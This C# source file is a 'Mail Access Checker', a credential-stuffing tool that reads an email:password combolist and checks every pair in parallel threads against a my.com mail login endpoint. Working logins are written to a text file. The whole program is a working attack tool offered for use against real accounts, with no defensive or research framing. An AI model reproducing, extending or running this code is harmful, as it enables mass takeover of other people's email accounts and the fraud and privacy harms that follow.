using System;
using System.Collections.Generic;
using System.Drawing;
using System.Linq;
using System.Threading;
using System.Threading.Tasks;
using Colorful;
using System.IO;
using System.Net;

namespace Mail_Access_Checker
{
    class Program
    {
        private static void Main(string[] args)
        {
            Banner();
            Colorful.Console.Title = "Mail Access Checker | Made by [Kaneki SΛD#8888]";
            System.Console.ForegroundColor = ConsoleColor.Red;
            Colorful.Console.Write("> ");
            System.Console.ForegroundColor = ConsoleColor.White;
            Colorful.Console.Write("Combolist");
            System.Console.ForegroundColor = ConsoleColor.Red;
            Colorful.Console.Write(": ");
            System.Console.ForegroundColor = ConsoleColor.White;
            string combopath = Colorful.Console.ReadLine();

            Banner();
            string[] array = File.ReadAllLines(combopath);
            foreach (string text in array)
            {
                string email = text.Split(':')[0];
                string password = text.Split(':')[1];

                new Thread(new ThreadStart(() =>
                {
                    Checker(email, password);
                })).Start();
            }
        }

        private static void Checker(string email, string password)
        {
            try
            {
                WebClient webClient = new WebClient();
                string requete = webClient.DownloadString("https://aj-https.my.com/cgi-bin/auth?model=&simple=1&Login=" + email + "&Password=" + password);
                if (requete == "Ok=1")
                {
                    System.Console.ForegroundColor = ConsoleColor.Green;
                    Colorful.Console.WriteLine("> Valid: " + email + ":" + password);

                    if (!File.Exists("Mail_Access.txt"))
                        File.Create("Mail_Access.txt");

                    File.AppendAllText("Mail_Access.txt", email + ":" + password + Environment.NewLine);
                    System.Console.ForegroundColor = ConsoleColor.White;

                }
                else
                {
                    System.Console.ForegroundColor = ConsoleColor.Red;
                    Colorful.Console.WriteLine("> Invalid: " + email + ":" + password);
                }
            }
            catch (OutOfMemoryException)
            {
                System.Console.ForegroundColor = ConsoleColor.Red;
                Colorful.Console.WriteLine("> Error ...");
            }
        }

        private static void Banner()
        {
            System.Console.ForegroundColor = ConsoleColor.Red;
            Colorful.Console.Clear();
            Colorful.Console.WriteLine("\n");
            Colorful.Console.WriteLine("                _  _ ____ _ _       ____ ____ ____ ____ ____ ____    ____ _  _ ____ ____ _  _ ____ ____");
            Colorful.Console.WriteLine("                |\\/| |__| | |       |__| |    |    |___ [__  [__     |    |__| |___ |    |_/  |___ |__/");
            Colorful.Console.WriteLine("                |  | |  | | |___    |  | |___ |___ |___ ___] ___]    |___ |  | |___ |___ | \\_ |___ |  \\");
            Colorful.Console.WriteLine("\n\n\n");
            System.Console.ForegroundColor = ConsoleColor.White;
        }
    }
}
